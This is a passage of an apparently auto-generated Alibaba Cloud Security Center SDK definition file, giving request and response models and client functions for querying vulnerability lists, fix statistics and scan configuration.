  ](name='FixStat', description='An array that consists of the statistics of vulnerability fixes by vulnerability type.'),
  fixTotal?: {
    fixedTodayNum?: int32(name='FixedTodayNum', description='The number of vulnerabilities that are fixed on the current day.', example='15'),
    fixedTotalNum?: int32(name='FixedTotalNum', description='The total number of fixed vulnerabilities.', example='47'),
    fixingNum?: int32(name='FixingNum', description='The number of vulnerabilities that are being fixed.', example='22'),
    needFixNum?: int32(name='NeedFixNum', description='The number of unfixed vulnerabilities.', example='62'),
  }(name='FixTotal', description='The total statistics of vulnerability fixes.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeVulFixStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulFixStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of vulnerability fixes.
 *
 * @param request DescribeVulFixStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulFixStatisticsResponse
 */
async function describeVulFixStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeVulFixStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVulFixStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of vulnerability fixes.
 *
 * @return DescribeVulFixStatisticsResponse
 */
async function describeVulFixStatistics(): DescribeVulFixStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulFixStatisticsWithOptions(runtime);
}

model DescribeVulListRequest {
  aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
  attachTypes?: string(name='AttachTypes', description='The additional type of the vulnerabilities. You need to specify this parameter when you query application vulnerabilities. Set the value to **sca**. If you set **Type** to **app**, you must specify this parameter.

> If you set this parameter to **sca**, application vulnerabilities and the vulnerabilities that are detected based on software component analysis are queried. If you do not specify this parameter, only application vulnerabilities are queried.', example='sca'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerabilities are fixed. Valid values:

*   **y**: yes
*   **n**: no', example='n'),
  groupId?: string(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='9207613'),
  ids?: string(name='Ids', description='The IDs of vulnerabilities. You can specify up to 50 IDs. Separate multiple IDs with commas (,).', example='282,281,283'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The alias of the vulnerability.', example='oval:com.redhat.rhsa:def:20172836'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf'),
  nextToken?: string(name='NextToken', description='The pagination token that is used in the next request to retrieve a new page of results. You must specify the token that is obtained from the previous query as the value of NextToken. You do not need to specify this parameter for the first request.', example='E17B501887A2D3AA5E8360A6EFA3B***'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**.', example='20'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset.', example='1.2.XX.XX'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='1232428423234****'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Separate multiple statuses with commas (,). Valid values:

- 1: unfixed
- 2: fix failed
- 3: rollback failed
- 4: being fixed
- 5: being rolled back
- 6: being verified
- 7: fixed
- 8: fixed and to be restarted
- 9: rolled back
- 10: ignored
- 11: rolled back and to be restarted
- 12: not found
- 20: expired', example='1,2,3'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability.
*   **app**: application vulnerability that is detected by using web scanner
*   **emg**: urgent vulnerability.
*   **sca**: application vulnerability that is detected by using software component analysis

This parameter is required.', example='cve'),
  useNextToken?: boolean(name='UseNextToken', description='Specifies whether to use NextToken to query the data of vulnerabilities. If you set UseNextToken to true, the value of TotalCount is not returned. Valid values:

*   **true**
*   **false**', example='false'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which you want to query the vulnerabilities. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to obtain the UUIDs.', example='1587bedb-fdb4-48c4-9330-****'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The ID of the virtual private cloud (VPC) in which the vulnerabilities are detected. Separate multiple IDs with commas (,).', example='ins-133****,ins-5414****'),
}

model DescribeVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  nextToken?: string(name='NextToken', description='The value of NextToken that is returned when the NextToken method is used.', example='E17B501887A2D3AA5E8360A6EFA3B***'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2F26AB2A-1075-488F-8472-40E5DB486ACC'),
  totalCount?: int32(name='TotalCount', description='The total number of vulnerabilities returned.', example='2'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
      authVersion?: string(name='AuthVersion', description='The edition of Security Center that is authorized to scan the asset. Valid values:

*   **1**: Basic.
*   **6**: Anti-virus.
*   **5**: Advanced.
*   **3**: Enterprise.
*   **7**: Ultimate.
*   **10**: Value-added Plan.', example='3'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to scan the asset. Valid values:

*   **true**
*   **false**', example='true'),
      extendContentJson?: {
        absolutePath?: string(name='AbsolutePath', description='The path to the package of the software that has the vulnerability.', example='/roo/www/web'),
        aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
        description?: string(name='Description', description='The description of the vulnerability.', example='kernel version:5.10.84-10.2.al8.x86_64'),
        emgProof?: string(name='EmgProof', description='The returned message that indicates the urgent vulnerability.', example='com.xxl.rpc.util.XxlRpcException: xxl-rpc request data is empty.\\\\n\\\\tat com.xxl.rpc.remoting.net.impl.servlet.serve"'),
        ip?: string(name='Ip', description='The public IP address of the asset that is associated with the vulnerability.', example='1.2.XX.XX'),
        lastTs?: long(name='LastTs', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
        necessity?: {
          assetsFactor?: string(name='Assets_factor', description='The asset importance score. Valid values:

*   **2**: important asset.
*   **1**: common asset.
*   **0**: test asset.', example='1'),
          cvssFactor?: string(name='Cvss_factor', description='The Common Vulnerability Scoring System (CVSS) score.', example='7.8'),
          enviromentFactor?: string(name='Enviroment_factor', description='The environment score.', example='1.0'),
          isCalc?: string(name='Is_calc', description='Indicates whether the vulnerability priority score is calculated. Valid values:

*   **0**: no.
*   **1**: yes.', example='1'),
          status?: string(name='Status', description='The status of the vulnerability priority score. Valid values:

*   **none**: No score is generated.
*   **pending**: The score is pending calculation.
*   **normal**: The calculation is normal.', example='normal'),
          timeFactor?: string(name='Time_factor', description='The time score.', example='1.0'),
          totalScore?: string(name='Total_score', description='The vulnerability priority score.

The following list describes scores and related fixing suggestions:

*   If the score is from **13.5 to 15**, the vulnerability is a high-risk vulnerability. You must fix the vulnerability at the earliest opportunity.
*   If the score is **greater than or equal to 7 but less than 13.5**, the vulnerability is a medium-risk vulnerability. You can fix the vulnerability at your convenience.
*   If the score is **less than 7**, the vulnerability is a low-risk vulnerability. You can ignore the vulnerability.', example='7.8'),
        }(name='Necessity', description='Indicates whether the vulnerability needs to be fixed.'),
        os?: string(name='Os', description='The name of the operating system.', example='centos'),
        osRelease?: string(name='OsRelease', description='The information about the operating system version.', example='7'),
        primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='111'),
        rpmEntityList?: [ 
          {
            containerName?: string(name='ContainerName', description='The name of the container.', example='k8s_67895c4_xxx'),
            extendField?: string(name='ExtendField', description='The extended information about the software package that has the vulnerability.', example='{"msg_no_lookups_configured_CVE_2021_44228": "false", "jndi_class_not_exist": "false"}'),
            fullVersion?: string(name='FullVersion', description='The complete version number.', example='3.10.0-693.2.2.el7'),
            imageName?: string(name='ImageName', description='The name of the image.', example='registry_387ytb_xxx'),
            matchDetail?: string(name='MatchDetail', description='The reason why the vulnerability is detected.', example='python-perf version less than 0:3.10.0-693.21.1.el7'),
            matchList?: [ string ](name='MatchList', description='The rules that are used to detect the vulnerability.'),
            name?: string(name='Name', description='The name of the RPM package.', example='python-perf'),
            path?: string(name='Path', description='The path to the software that has the vulnerability.', example='/usr/lib64/python2.7/site-packages'),
            pid?: string(name='Pid', description='The process ID.', example='8664'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='*** update python-perf'),
            version?: string(name='Version', description='The version number of the package of the software that has the vulnerability.', example='3.10.0'),
          }
        ](name='RpmEntityList', description='The information about RPM Package Manager (RPM) packages.'),
        status?: string(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed.
*   **2**: fix failed.
*   3: rollback failed.
*   **4**: being fixed.
*   **5**: being rolled back.
*   **6**: being verified.
*   **7**: fixed.
*   **8**: fixed and to be restarted.
*   **9**: rolled back.
*   **10**: ignored.
*   **11**: rolled back and to be restarted.
*   **12**: not found.
*   **20**: expired.', example='1'),
        tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
        target?: string(name='Target', description='The URL of the vulnerability.', example='http://39.99.XX.XX:30005/toLogin'),
        cveList?: [ string ](name='cveList', description='The CVE list.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp when the vulnerability was first detected. Unit: milliseconds.', example='1554189334000'),
      groupId?: int32(name='GroupId', description='The ID of the asset group.', example='281801'),
      instanceId?: string(name='InstanceId', description='The ID of the asset.', example='i-bp18t***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='testInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      k8sClusterId?: string(name='K8sClusterId', description='The ID of the cluster.

>  The value of this parameter is returned only if you use the Ultimate edition of Security Center that can protect container assets.', example='c863dc93bed3843de9934d4346dc4****'),
      k8sNamespace?: string(name='K8sNamespace', description='The namespace.

>  If you use the Ultimate edition of Security Center, the value of this parameter is queried from container assets. If you do not use the Ultimate edition, the value of this parameter is queried from the Security Center agent.', example='default'),
      k8sNodeId?: string(name='K8sNodeId', description='The ID of the node.

>  The value of this parameter is returned only if you use the Ultimate edition of Security Center that can protect container assets.', example='i-bp1ifm6suw9mnbsr****'),
      k8sNodeName?: string(name='K8sNodeName', description='The name of the node.

>  The value of this parameter is returned only if you use the Ultimate edition of Security Center that can protect container assets.', example='deployment-riskai-7b67d68975-m****'),
      k8sPodName?: string(name='K8sPodName', description='The name of the pod.

>  The value of this parameter is returned only if you use the Ultimate edition of Security Center that can protect container assets.', example='deployment-riskai-7b67d68975-m****'),
      lastTs?: long(name='LastTs', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
      modifyTs?: long(name='ModifyTs', description='The timestamp when the vulnerability status was modified. Unit: milliseconds.', example='1620404763000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20170574'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high.
*   **later**: medium.
*   **nntf**: low.

>  We recommend that you fix **high-risk** vulnerabilities at the earliest opportunity.', example='asap'),
      online?: boolean(name='Online', description='Indicates whether the Security Center agent on the asset is online. Valid values:

*   **true**
*   **false**', example='true'),
      osName?: string(name='OsName', description='The name of the operating system for your asset.', example='CentOS 7.2 64-bit'),
      osVersion?: string(name='OsVersion', description='The name of the operating system for your asset.', example='linux'),
      primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='101162078'),
      progress?: int32(name='Progress', description='The progress of the vulnerability fixing.', example='100'),
      raspDefend?: int32(name='RaspDefend', description='Indicates whether the application protection feature is supported. Valid values:

*   **0**: no.
*   **1**: yes.

>  If this parameter is not returned, the application protection feature is not supported.', example='1'),
      raspStatus?: int32(name='RaspStatus', description='The protection mode of the application protection feature. Valid values:

*   **0**: unprotected.
*   **1**: the Monitor mode.
*   **2**: the Block mode.
*   **3**: disabled.', example='1'),
      realRisk?: boolean(name='RealRisk', description='Indicates whether the vulnerability is easily exploited. Valid values:

*   **true**
*   **false**', example='true'),
      regionId?: string(name='RegionId', description='The region ID of the asset.', example='cn-hangzhou'),
      related?: string(name='Related', description='The Common Vulnerabilities and Exposures (CVE) IDs related to the vulnerability. Multiple CVE IDs are separated by commas (,).', example='CVE-2017-7518,CVE-2017-12188'),
      repairTs?: long(name='RepairTs', description='The timestamp when the vulnerability was fixed. Unit: milliseconds. This parameter is returned only if you fix vulnerabilities in the Security Center console.', example='1541207563000'),
      resultCode?: string(name='ResultCode', description='The code that indicates the vulnerability fixing result.', example='0'),
      resultMessage?: string(name='ResultMessage', description='The message that indicates the vulnerability fixing result.', example='timeout'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed.
*   **2**: fix failed.
*   **3**: rollback failed.
*   **4**: being fixed.
*   **5**: being rolled back.
*   **6**: being verified.
*   **7**: fixed.
*   **8**: fixed and to be restarted.
*   **9**: rolled back.
*   **10**: ignored.
*   **11**: rolled back and to be restarted.
*   **12**: not found.
*   **20**: expired.', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **cms**: Web-CMS vulnerability.
*   **emg**: urgent vulnerability.
*   **app**: application vulnerability.
*   **sca**: application vulnerability that is detected by using software component analysis.', example='cve'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='04c56617-23fc-43a5-ab9b-****'),
    }
  ](name='VulRecords', description='The information about the vulnerability.'),
}

model DescribeVulListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulListResponseBody(name='body'),
}

/**
 * @summary Queries vulnerabilities by type.
 *
 * @param request DescribeVulListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulListResponse
 */
async function describeVulListWithOptions(request: DescribeVulListRequest, runtime: Util.RuntimeOptions): DescribeVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.nextToken)) {
    query['NextToken'] = request.nextToken;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.useNextToken)) {
    query['UseNextToken'] = request.useNextToken;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries vulnerabilities by type.
 *
 * @param request DescribeVulListRequest
 * @return DescribeVulListResponse
 */
async function describeVulList(request: DescribeVulListRequest): DescribeVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulListWithOptions(request, runtime);
}

model DescribeVulListPageRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.', example='CVE-2022-44702'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  raspDefend?: int32(name='RaspDefend', description='Indicates whether the application protection feature is supported. Valid values:

- **0**: no.

- **1**: yes.', example='0'),
  vulNameLike?: string(name='VulNameLike', description='The name of the vulnerability.', example='RCE vulnerability'),
  vulType?: string(name='VulType', description='The type of the vulnerabilities. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **app**: Application vulnerability that is detected by using web scanner.', example='cve'),
}

model DescribeVulListPageResponseBody = {
  data?: [ 
    {
      cveId?: string(name='CveId', description='The common vulnerabilities and exposures (CVE) ID of the vulnerability.', example='CVE-2022-42836'),
      extAegis?: string(name='ExtAegis', description='The extended field for Server Guard.', example='{\\\\"relatedType\\\\":[{\\\\"type\\\\":\\\\"sys\\\\"}]}'),
      id?: long(name='Id', description='The primary key ID of the database.', example='40586'),
      isAegis?: int32(name='IsAegis', description='Indicates whether the vulnerability was detected based on version comparison. Valid values:

*   1: The vulnerability was detected based on version comparison.
*   0: The vulnerability was not detected based on version comparison.', example='1'),
      isSas?: int32(name='IsSas', description='Indicates whether the vulnerability was detected based on proof of concept (POC) verification. Valid values:

*   1: The vulnerability was detected based on POC verification.
*   0: The vulnerability was not detected based on POC verification.', example='0'),
      otherId?: string(name='OtherId', description='The ID of the vulnerability.', example='AVD-2018-8218'),
      releaseTime?: long(name='ReleaseTime', description='The time when the vulnerability was disclosed.', example='2022-12-13T08:00Z'),
      title?: string(name='Title', description='The name of the vulnerability.', example='Windows RCE vulnerability'),
    }
  ](name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4347E985-6E64-467B-96EC-30D4EA9E32FB'),
  totalCount?: int32(name='TotalCount', description='The total number of entries.', example='100'),
}

model DescribeVulListPageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulListPageResponseBody(name='body'),
}

/**
 * @summary Queries the vulnerabilities that can be detected.
 *
 * @param request DescribeVulListPageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulListPageResponse
 */
async function describeVulListPageWithOptions(request: DescribeVulListPageRequest, runtime: Util.RuntimeOptions): DescribeVulListPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.cveId)) {
    query['CveId'] = request.cveId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.raspDefend)) {
    query['RaspDefend'] = request.raspDefend;
  }
  if (!Util.isUnset(request.vulNameLike)) {
    query['VulNameLike'] = request.vulNameLike;
  }
  if (!Util.isUnset(request.vulType)) {
    query['VulType'] = request.vulType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulListPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the vulnerabilities that can be detected.
 *
 * @param request DescribeVulListPageRequest
 * @return DescribeVulListPageResponse
 */
async function describeVulListPage(request: DescribeVulListPageRequest): DescribeVulListPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulListPageWithOptions(request, runtime);
}

model DescribeVulMetaCountStatisticsResponseBody = {
  appCount?: int32(name='AppCount', description='The number of application vulnerabilities.', example='0'),
  cveCount?: int32(name='CveCount', description='The number of Linux software vulnerabilities.', example='10'),
  raspDefendCount?: int32(name='RaspDefendCount', description='The number of vulnerabilities that can be defended by the application protection feature.', example='10'),
  requestId?: string(name='RequestId', description='The request ID.', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
  sysCount?: int32(name='SysCount', description='The number of Windows system vulnerabilities.', example='10'),
}

model DescribeVulMetaCountStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulMetaCountStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of vulnerabilities in Security Center.
 *
 * @param request DescribeVulMetaCountStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulMetaCountStatisticsResponse
 */
async function describeVulMetaCountStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeVulMetaCountStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVulMetaCountStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of vulnerabilities in Security Center.
 *
 * @return DescribeVulMetaCountStatisticsResponse
 */
async function describeVulMetaCountStatistics(): DescribeVulMetaCountStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulMetaCountStatisticsWithOptions(runtime);
}

model DescribeVulNumStatisticsRequest {
  from?: string(name='From', description='The source of the request.

*   If you want to query Security Center-related data, set the value to **sas**.
*   If you want to query Server Guard-related data, you do not need to specify this parameter.', example='sas'),
}

model DescribeVulNumStatisticsResponseBody = {
  appCnt?: int32(name='AppCnt', description='The number of application vulnerabilities that are detected on the asset by using the web scanner.', example='0'),
  appNum?: int32(name='AppNum', description='The number of application vulnerabilities that are detected on the asset by using the web scanner.', example='0'),
  cmsDealedTotalNum?: int32(name='CmsDealedTotalNum', description='The number of Web-CMS vulnerabilities that are handled.', example='0'),
  cmsNum?: int32(name='CmsNum', description='The number of Web-CMS vulnerabilities that are detected on the asset.', example='0'),
  cveNum?: int32(name='CveNum', description='The number of Linux software vulnerabilities that are detected on the asset.', example='0'),
  emgNum?: int32(name='EmgNum', description='The number of urgent vulnerabilities that are detected on the asset.', example='0'),
  requestId?: string(name='RequestId', description='The request ID.', example='E22C89D2-FE13-5800-8746-9D0EF1827A59'),
  scaNum?: int32(name='ScaNum', description='The number of middleware vulnerabilities that are detected on the asset.', example='0'),
  sysNum?: int32(name='SysNum', description='The number of Windows system vulnerabilities that are detected on the asset.', example='0'),
  vulAsapSum?: int32(name='VulAsapSum', description='The number of vulnerabilities that have the high priority.', example='0'),
  vulDealedTotalNum?: int32(name='VulDealedTotalNum', description='The number of vulnerabilities that are handled.', example='0'),
  vulLaterSum?: int32(name='VulLaterSum', description='The number of vulnerabilities that have the medium priority.', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', description='The number of vulnerabilities that have the low priority.', example='0'),
}

model DescribeVulNumStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulNumStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of vulnerabilities.
 *
 * @param request DescribeVulNumStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulNumStatisticsResponse
 */
async function describeVulNumStatisticsWithOptions(request: DescribeVulNumStatisticsRequest, runtime: Util.RuntimeOptions): DescribeVulNumStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulNumStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of vulnerabilities.
 *
 * @param request DescribeVulNumStatisticsRequest
 * @return DescribeVulNumStatisticsResponse
 */
async function describeVulNumStatistics(request: DescribeVulNumStatisticsRequest): DescribeVulNumStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulNumStatisticsWithOptions(request, runtime);
}

model DescribeVulTargetConfigRequest {
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability', example='cve'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='ae1527a9-2308-46ab-b10a-48ae7ff7****'),
}

model DescribeVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
  targetConfigs?: [ 
    {
      config?: string(name='Config', description='Indicates whether the vulnerability scan feature is enabled for the server.

*   **off**: disabled
*   **on**: enabled', example='on'),
      overAllConfig?: string(name='OverAllConfig', description='Indicates whether the vulnerability scan feature is enabled for all servers. Valid values:

*   **off**: disabled
*   **on**: enabled', example='on'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability', example='cve'),
    }
  ](name='TargetConfigs', description='An array that consists of the configurations.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
}

model DescribeVulTargetConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulTargetConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of the vulnerability scan feature for a server.
 *
 * @param request DescribeVulTargetConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulTargetConfigResponse
 */
async function describeVulTargetConfigWithOptions(request: DescribeVulTargetConfigRequest, runtime: Util.RuntimeOptions): DescribeVulTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of the vulnerability scan feature for a server.
 *
 * @param request DescribeVulTargetConfigRequest
 * @return DescribeVulTargetConfigResponse
 */
async function describeVulTargetConfig(request: DescribeVulTargetConfigRequest): DescribeVulTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulTargetConfigWithOptions(request, runtime);
}

model DescribeVulTargetStatisticsRequest {
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability', example='cve'),
}

model DescribeVulTargetStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
  targetStats?: [ 
    {
      targets?: [ 
        {
          flag?: string(name='Flag', description='Indicates whether the configurations are applied to the server. Valid values:

*   **add**: yes
*   **del**: no', example='add'),
